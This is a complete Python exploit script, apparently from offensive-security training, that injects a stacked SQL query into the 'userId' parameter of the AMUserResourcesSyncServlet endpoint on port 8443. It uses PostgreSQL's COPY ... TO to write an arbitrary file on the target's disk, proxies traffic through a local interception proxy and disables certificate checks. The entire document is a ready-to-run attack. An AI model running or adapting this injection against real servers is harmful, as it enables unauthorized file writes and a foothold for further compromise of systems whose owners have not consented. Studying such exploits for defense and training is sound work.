import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#write a file using COPY TO

def main():
	if len(sys.argv) != 2:
		print("Give target url")
		print("Example: %s target url" % sys.argv[0])
		sys.exit(1)

	url = sys.argv[1]
	file_content = "Kryptocookieproxie"
	file_path = "c:\\offsec.txt"

	params = {
		'ForMasRange':'1',
		'userId' : '1;COPY (SELECT $$$%s$$$) TO $$$$%s$$$$;--+' % (file_content, file_path)}

	try:
		r = requests.get('http://%s:8443/servlet/AMUserResourcesSyncServlet' %url, params=params, proxies=proxies, verify=False)

		if r.status_code == 200:
			print("Request send successfully")
			print("Status code: %d" % r.status_code)
		else:
			print("Something went wrong. Status code: %d" % r.status_code)

	except requests.RequestException as e:
		print("Request failed: %s" % e)

if __name__ == '__main__':
	main()
